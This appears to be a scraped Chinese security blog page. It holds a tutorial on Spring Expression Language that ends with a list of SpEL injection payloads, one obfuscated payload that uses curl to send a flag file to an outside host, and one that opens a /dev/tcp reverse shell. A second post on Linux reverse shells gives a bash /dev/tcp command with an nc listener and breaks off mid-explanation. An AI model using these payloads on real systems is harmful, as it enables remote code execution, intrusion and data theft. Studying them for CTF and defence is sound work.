        
          
            <h1 id="SpEL-简介"><a href="#SpEL-简介" class="headerlink" title="SpEL 简介"></a>SpEL 简介</h1><ul>
<li><p>全称为 Spring Expression Language，即 Spring 表达式语言，和 JSP 类似但是强于 JSP</p>
</li>
<li><p>官方文档 : <a href="https://docs.spring.io/spring/docs/3.0.x/reference/expressions.html" target="_blank" rel="noopener">https://docs.spring.io/spring/docs/3.0.x/reference/expressions.html</a></p>
</li>
<li><p>语法 : </p>
<ul>
<li><code>#{...}</code> 大括号内的字符都是 SpEL 表达式，用于引入变量，属性，方法等</li>
<li><code>${...}</code> 大括号内的是属性名</li>
<li><code>T(Type)</code> 用此表示类实例，返回一个类对象，常用于引入静态常量或者静态方法</li>
</ul>
</li>
<li><p>用法 : </p>
<ul>
<li><p>注解在 @value 中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">FieldValueTestBean</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line">  @Value("#&#123; systemProperties['user.region'] &#125;")</span><br><span class="line">  <span class="keyword">private</span> String defaultLocale;</span><br><span class="line"><span class="comment">// systemProperties['user.region'] 是预先定义好的，赋值给 defaultLocale</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDefaultLocale</span><span class="params">(String defaultLocale)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.defaultLocale = defaultLocale;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">getDefaultLocale</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.defaultLocale;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>bean 依赖</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"numberGuess"</span> <span class="attr">class</span>=<span class="string">"org.spring.samples.NumberGuess"</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 相当于将一个随机数乘 100.0 赋值给 randomNumber --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"randomNumber"</span> <span class="attr">value</span>=<span class="string">"#&#123; T(java.lang.Math).random() * 100.0 &#125;"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- other properties --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在代码块中使用 Expression，ExpressionParser 将字符串表达式转换为 Expression 对象，因此，parseExpression 的值将在 EvaluationContext 中可用。此EvaluationContext 将是唯一可以从中访问字符串 EL 中的所有属性和变量的对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 解析器，解析表达式</span></span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line"><span class="comment">// 计算先前定义好的表达式</span></span><br><span class="line">Expression exp = parser.parseExpression(<span class="string">"'Hello World'.concat('!')"</span>);</span><br><span class="line"><span class="comment">// 获取结果 'Hello World!'</span></span><br><span class="line">String message = (String) exp.getValue();</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>变量 : </p>
<ul>
<li><code>#bean_id</code> 获取容器内变量</li>
<li><code>#this</code> 使用当前正在计算的上下文</li>
<li><code>#root</code> 引用容器的 root 对象</li>
</ul>
</li>
</ul>
<h1 id="SpEL-表达式"><a href="#SpEL-表达式" class="headerlink" title="SpEL 表达式"></a>SpEL 表达式</h1><ul>
<li><p>文本表达式 : 支持字符串，日期，数字，布尔和 null</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line"></span><br><span class="line"><span class="comment">// evals to "Hello World"</span></span><br><span class="line">String helloWorld = (String) parser.parseExpression(<span class="string">"'Hello World'"</span>).getValue(); </span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> avogadrosNumber  = (Double) parser.parseExpression(<span class="string">"6.0221415E+23"</span>).getValue();  </span><br><span class="line"></span><br><span class="line"><span class="comment">// evals to 2147483647</span></span><br><span class="line"><span class="keyword">int</span> maxValue = (Integer) parser.parseExpression(<span class="string">"0x7FFFFFFF"</span>).getValue();  </span><br><span class="line"></span><br><span class="line"><span class="keyword">boolean</span> trueValue = (Boolean) parser.parseExpression(<span class="string">"true"</span>).getValue();</span><br><span class="line"></span><br><span class="line">Object nullValue = parser.parseExpression(<span class="string">"null"</span>).getValue();</span><br></pre></td></tr></table></figure>
</li>
<li><p>属性值( Properties )使用 <code>.</code> 来访问，数组( Arrays )和列表( Lists )使用 <code>[]</code> 来获取元素，字典( maps )使用 <code>[]</code> 和 key 访问 value</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// evals to 1856</span></span><br><span class="line"><span class="keyword">int</span> year = (Integer) parser.parseExpression(<span class="string">"Birthdate.Year + 1900"</span>).getValue(context); </span><br><span class="line"></span><br><span class="line"><span class="comment">// Inventions Array</span></span><br><span class="line">StandardEvaluationContext teslaContext = <span class="keyword">new</span> StandardEvaluationContext(tesla);</span><br><span class="line"><span class="comment">// evaluates to "Induction motor"</span></span><br><span class="line">String invention = parser.parseExpression(<span class="string">"inventions[3]"</span>).getValue(teslaContext, String.class); </span><br><span class="line"></span><br><span class="line"><span class="comment">// Members List</span></span><br><span class="line">StandardEvaluationContext societyContext = <span class="keyword">new</span> StandardEvaluationContext(ieee);</span><br><span class="line"><span class="comment">// evaluates to "Nikola Tesla"</span></span><br><span class="line">String name = parser.parseExpression(<span class="string">"Members[0].Name"</span>).getValue(societyContext, String.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Officer's Dictionary</span></span><br><span class="line">Inventor pupin = parser.parseExpression(<span class="string">"Officers['president']"</span>).getValue(societyContext, Inventor.class);</span><br><span class="line"><span class="comment">// evaluates to "Idvor"</span></span><br><span class="line">String city = parser.parseExpression(<span class="string">"Officers['president'].PlaceOfBirth.City"</span>).getValue(societyContext, String.class);</span><br><span class="line"><span class="comment">// setting values</span></span><br><span class="line">parser.parseExpression(<span class="string">"Officers['advisors'][0].PlaceOfBirth.Country"</span>).setValue(societyContext, <span class="string">"Croatia"</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>列表( Lists )可以在表达式中直接使用 <code>{}</code> 表达</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// evaluates to a Java list containing the four numbers</span></span><br><span class="line">List numbers = (List) parser.parseExpression(<span class="string">"&#123;1,2,3,4&#125;"</span>).getValue(context); </span><br><span class="line"></span><br><span class="line">List listOfLists = (List) parser.parseExpression(<span class="string">"&#123;&#123;'a','b'&#125;,&#123;'x','y'&#125;&#125;"</span>).getValue(context);</span><br></pre></td></tr></table></figure>
</li>
<li><p>数组可以在表达式中直接使用 Java 语法构建，但是多维数组不能手动初始化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] numbers1 = (<span class="keyword">int</span>[]) parser.parseExpression(<span class="string">"new int[4]"</span>).getValue(context); </span><br><span class="line"></span><br><span class="line"><span class="comment">// Array with initializer</span></span><br><span class="line"><span class="keyword">int</span>[] numbers2 = (<span class="keyword">int</span>[]) parser.parseExpression(<span class="string">"new int[]&#123;1,2,3&#125;"</span>).getValue(context); </span><br><span class="line"></span><br><span class="line"><span class="comment">// Multi dimensional array</span></span><br><span class="line"><span class="keyword">int</span>[][] numbers3 = (<span class="keyword">int</span>[][]) parser.parseExpression(<span class="string">"new int[4][5]"</span>).getValue(context);</span><br></pre></td></tr></table></figure>
</li>
<li><p>Java 函数可以直接在表达式中使用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// string literal, evaluates to "bc"</span></span><br><span class="line">String c = parser.parseExpression(<span class="string">"'abc'.substring(2, 3)"</span>).getValue(String.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// evaluates to true</span></span><br><span class="line"><span class="keyword">boolean</span> isMember = parser.parseExpression(<span class="string">"isMember('MihajloPupin')"</span>).getValue(societyContext, Boolean.class);</span><br></pre></td></tr></table></figure>
</li>
<li><p>可以使用关系运算，逻辑运算和数学运算</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;, &gt;, &lt;=, &gt;=, ==, !=, /, %, !</span><br><span class="line">AND, OR, NOT</span><br><span class="line">+, -, *, /, %, ^</span><br></pre></td></tr></table></figure>
</li>
<li><p>赋值可以通过赋值运算符来完成，也可以在 setValue 函数中完成，也可以在 getValue 的调用中完成</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Inventor inventor = <span class="keyword">new</span> Inventor();		</span><br><span class="line">StandardEvaluationContext inventorContext = <span class="keyword">new</span> StandardEvaluationContext(inventor);</span><br><span class="line"></span><br><span class="line">parser.parseExpression(<span class="string">"Name"</span>).setValue(inventorContext, <span class="string">"Alexander Seovic2"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// alternatively( 或者 )</span></span><br><span class="line">String aleks = parser.parseExpression(<span class="string">"Name = 'AlexandarSeovic'"</span>).getValue(inventorContext, String.class);</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>T(Type)</code> 可以指定 <code>java.lang.class</code> 的实例，但是对于其他实例，要完全限定</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class dateClass = parser.parseExpression(<span class="string">"T(java.util.Date)"</span>).getValue(Class.class);</span><br><span class="line"></span><br><span class="line">Class stringClass = parser.parseExpression(<span class="string">"T(String)"</span>).getValue(Class.class);</span><br><span class="line"></span><br><span class="line"><span class="keyword">boolean</span> trueValue = parser.parseExpression(<span class="string">"T(java.math.RoundingMode).CEILING &lt; T(java.math.RoundingMode).FLOOR"</span>).getValue(Boolean.class);</span><br></pre></td></tr></table></figure>
</li>
<li><p>可以使用 <code>new</code> 调用构造函数，但是除了基元类型和字符串（其中可以使用int、float等）之外，所有的类都应该使用完全限定的类名</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Inventor einstein = p.parseExpression(<span class="string">"new org.spring.samples.spel.inventor.Inventor('Albert Einstein', 'German')"</span>).getValue(Inventor.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">//create new inventor instance within add method of List</span></span><br><span class="line">p.parseExpression(<span class="string">"Members.add(new org.spring.samples.spel.inventor.Inventor('Albert Einstein', 'German'))"</span>).getValue(societyContext);</span><br></pre></td></tr></table></figure>
</li>
<li><p>变量可以使用 <code>#变量名</code> 来进行引用，这些变量是在 <code>StandardEvaluationContext</code> 中使用 <code>setVariable</code> 赋值的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Inventor tesla = <span class="keyword">new</span> Inventor(<span class="string">"Nikola Tesla"</span>, <span class="string">"Serbian"</span>);</span><br><span class="line">StandardEvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext(tesla);</span><br><span class="line">context.setVariable(<span class="string">"newName"</span>, <span class="string">"Mike Tesla"</span>);</span><br><span class="line"><span class="comment">// 首字母不区分大小写</span></span><br><span class="line">parser.parseExpression(<span class="string">"Name = #newName"</span>).getValue(context);</span><br><span class="line"></span><br><span class="line">System.out.println(tesla.getName()) <span class="comment">// "Mike Tesla"</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用 <code>#root</code> 引用根对象，使用 <code>#this</code> 引用当前上下文对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create an array of integers</span></span><br><span class="line">List&lt;Integer&gt; primes = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">primes.addAll(Arrays.asList(<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// create parser and set variable 'primes' as the array of integers</span></span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">StandardEvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">context.setVariable(<span class="string">"primes"</span>,primes);</span><br><span class="line"></span><br><span class="line"><span class="comment">// all prime numbers &gt; 10 from the list (using selection ?&#123;...&#125;)</span></span><br><span class="line"><span class="comment">// evaluates to [11, 13, 17]</span></span><br><span class="line">List&lt;Integer&gt; primesGreaterThanTen = (List&lt;Integer&gt;) parser.parseExpression(<span class="string">"#primes.?[#this&gt;10]"</span>).getValue(context);</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过使用 <code>StandardEvaluationContext</code> 中的 <code>registerFunction(String name, Method m)</code> 函数来自定义函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">StringUtils</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">reverseString</span><span class="params">(String input)</span> </span>&#123;</span><br><span class="line">    StringBuilder backwards = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; input.length(); i++) </span><br><span class="line">      backwards.append(input.charAt(input.length() - <span class="number">1</span> - i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> backwards.toString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">StandardEvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">context.registerFunction(<span class="string">"reverseString"</span>, StringUtils.class.getDeclaredMethod(<span class="string">"reverseString"</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;));</span><br><span class="line"></span><br><span class="line">String helloWorldReversed = parser.parseExpression(<span class="string">"#reverseString('hello')"</span>).getValue(context, String.class);</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果已使用 Bean 解析器配置了上下文，可以使用 <code>@</code> 获取 Bean</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">StandardEvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">context.setBeanResolver(<span class="keyword">new</span> MyBeanResolver());</span><br><span class="line"></span><br><span class="line"><span class="comment">// This will end up calling resolve(context,"foo") on MyBeanResolver during evaluation</span></span><br><span class="line">Object bean = parser.parseExpression(<span class="string">"@foo"</span>).getValue(context);</span><br></pre></td></tr></table></figure>
</li>
<li><p>表达式允许多个文本和解析块混合使用，常以 <code>#{}</code> 作为分界符</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String randomPhrase = parser.parseExpression(<span class="string">"random number is #&#123;T(java.lang.Math).random()&#125;"</span>, <span class="keyword">new</span> TemplateParserContext()).getValue(String.class);</span><br><span class="line"><span class="comment">// evaluates to "random number is 0.7038186818312008"</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="SpEL-中的-RCE"><a href="#SpEL-中的-RCE" class="headerlink" title="SpEL 中的 RCE"></a>SpEL 中的 RCE</h1><ul>
<li><p>SpEL 有两种 EvaluationContext，StandardEcalutionContext 和 SimpleEvaluationContext</p>
</li>
<li><p>两种 EvaluationContext 的区别 : </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">String calc = <span class="string">"T(java.lang.Runtime).getRuntime().exec('calc.exe')"</span>;</span><br><span class="line"></span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line"></span><br><span class="line">StandardEvaluationContext std_danger = <span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">EvaluationContext simple_safe = SimpleEvaluationContext.forReadOnlyDataBinding ().build();</span><br><span class="line"></span><br><span class="line">Expression exp = parser.parseExpression(calc);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行命令</span></span><br><span class="line">Object value_1 = exp.getValue(std_danger);</span><br><span class="line"><span class="comment">//报错</span></span><br><span class="line">Object value_2 = exp.getValue(simple_safe);</span><br></pre></td></tr></table></figure>
</li>
<li><p>在不指定 <code>EvaluationContext</code> 时，默认采用的是 <code>StandardEvaluationContext</code>，例如 Spring Data Commons 远程代码执行漏洞_CVE-2018-1273( 1.13-1.13.10, 2.0-2.0.5 )，SpringBoot SpEL表达式注入漏洞( 1.1.0-1.1.12, 1.2.0-1.2.7, 1.3.0 )，</p>
</li>
<li><p>payload : </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://rui0.cn/archives/1043</span></span><br><span class="line"></span><br><span class="line">$&#123;<span class="number">12</span>*<span class="number">12</span>&#125;</span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(<span class="string">"nslookup a.com"</span>)</span><br><span class="line">T(Thread).sleep(<span class="number">10000</span>)</span><br><span class="line">#this.getClass().forName('java.lang.Runtime').getRuntime().exec('nslookup a.com')</span><br><span class="line"><span class="keyword">new</span> java.lang.ProcessBuilder(&#123;<span class="string">'nslookup a.com'</span>&#125;).start()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用反射构造</span></span><br><span class="line">#&#123;T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]&#123;"/bin/bash","-c","curl fg5hme.ceye.io/`cat flag_j4v4_chun|base64|tr '\n' '-'`"&#125;)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用 ScriptEngineManager 构造</span></span><br><span class="line">#&#123;T(javax.script.ScriptEngineManager).newInstance().getEngineByName("nashorn").eval("s=[3];s[0]='/bin/bash';s[1]='-c';s[2]='ex"+"ec 5&lt;&gt;/dev/tcp/1.2.3.4/2333;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done';java.la"+"ng.Run"+"time.getRu"+"ntime().ex"+"ec(s);")&#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/23/反弹 shell/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="peri0d">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/toux.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="peri0d的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/07/23/反弹 shell/" itemprop="url">Linux 反弹 shell</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-23T20:27:52+08:00">
                2019-07-23
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透/" itemprop="url" rel="index">
                    <span itemprop="name">渗透</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="文件描述符与重定向"><a href="#文件描述符与重定向" class="headerlink" title="文件描述符与重定向"></a>文件描述符与重定向</h1><h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h2><ul>
<li>文件描述符是一个非负整数，它指向一个打开的文件，可以理解为指针指向打开的文件，但它并不是指针</li>
<li>实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。一般适用于 Linux 和 Unix 系统</li>
<li>也可以理解为文件的身份 ID，用于表明每个被进程打开的文件</li>
<li>每一个文件描述符会与一个打开文件相对应，同时，不同的文件描述符也会指向同一个文件</li>
<li>一般情况下，Linux 下的三个默认文件描述符如下 : <ul>
<li>0 表示标准输入，只读</li>
<li>1 表示标准输出，只写</li>
<li>2 表示标准错误输出，只写</li>
</ul>
</li>
<li>程序刚刚启动的时候，0 是标准输入，1 是标准输出，2 是标准错误输出。如果此时去打开一个新的文件，它的文件描述符会是 3 </li>
<li>在 Linux 中，一切都是文件，键盘显示器设备都是文件，它们的输入输出也由文件描述符控制</li>
</ul>
<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><ul>
<li><p>重定向主要有两种 : </p>
<ul>
<li>输入重定向 <code>&lt;</code> : 对 0 重定向</li>
<li>输出重定向 <code>&gt;</code> : 对 1 重定向</li>
</ul>
</li>
<li><p>bash 在执行一条指令时，首先会处理重定向符号</p>
</li>
<li><p>如果指令中存在多个重定向，那么它的解析顺序是从左向右</p>
</li>
<li><p>输入重定向( <code>&lt;</code> )例子如下，首先解析器会先解析重定向，将标准输入指向 file，这时再使用 cat 从标准输入读取时，就会读取 file</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/re_shell_1.PNG" alt></p>
</li>
<li><p>输出重定向( <code>&gt;</code> )例子如下，首先解析器会先解析重定向，将标准输出指向 file，这时使用 echo 输入字符串，就会直接输入到 file 中</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/re_shell_2.PNG" alt></p>
</li>
<li><p>标准输出与标准错误输出重定向( <code>&amp;&gt;</code> )例子如下，首先，执行一个错误的命令，可以看到，错误输出到了 file 中，后面执行一个正确的命令，结果也输出到了 file 中。这两个命令等价于 <code>mkdir 1&gt; file 2&gt;&amp;1</code> 和 <code>ls 1&gt; file 2&gt;&amp;1</code></p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/re_shell_3.PNG" alt></p>
</li>
<li><p>0、1、2 是默认的文件描述符，其之后的可以自行使用，例子如下，创建文件描述符 3 并指向 file，然后 cat 读取</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/re_shell_4.PNG" alt></p>
</li>
<li><p>还有一种重定向，<code>&lt;&gt;</code> 表示同时对文件进行读写，例子如下。以读写模式打开 file 同时将文件描述符 6 指向 file，然后 cat 读取</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/re_shell_5.PNG" alt></p>
</li>
</ul>
<h1 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h1><h2 id="什么是反弹-shell"><a href="#什么是反弹-shell" class="headerlink" title="什么是反弹 shell"></a>什么是反弹 shell</h2><ul>
<li><p>就是控制端监听在某 TCP/UDP 端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。其本质上是网络概念的客户端与服务端的角色反转。通常用于被控端因防火墙受限、权限不足、端口被占用等情形。</p>
</li>
<li><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web 服务，ssh，telnet 等等，都是正向连接。</p>
</li>
<li><p>那么什么时候使用反弹 shell 呢？</p>
<ul>
<li>靶机中了你的网马，但是它在局域网内，直接连接不了</li>
<li>靶机的 IP 会动态改变，不能持续控制</li>
<li>由于防火墙等限制，靶机只能发送请求，不能接收请求</li>
<li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策</li>
</ul>
</li>
<li><p>所谓反弹 shell，就是受害者连接攻击者指定的服务端，从而使攻击者 getshell</p>
</li>
<li><p>举个例子，靶机 : 192.168.233.132，攻击者 : 192.168.233.130，在攻击者上执行 <code>nc -lvp 4096</code> 监听 4096 端口，在靶机上执行 <code>bash -i &gt;&amp; /dev/tcp/192.168.233.130/4096 0&gt;&amp;1</code>，将会有如下界面 : </p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/re_shell_6.PNG" alt></p>
</li>
</ul>
<h2 id="反弹-shell-分析"><a href="#反弹-shell-分析" class="headerlink" title="反弹 shell 分析"></a>反弹 shell 分析</h2><ul>
<li><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code><ul>
<li><code>bash -i</code> 创建一个交互式 bash 进程</li>
<li><code>/dev/tcp/ip/port</code> 与 <code>IP:port</code> 建立一个 TCP 连接</li>
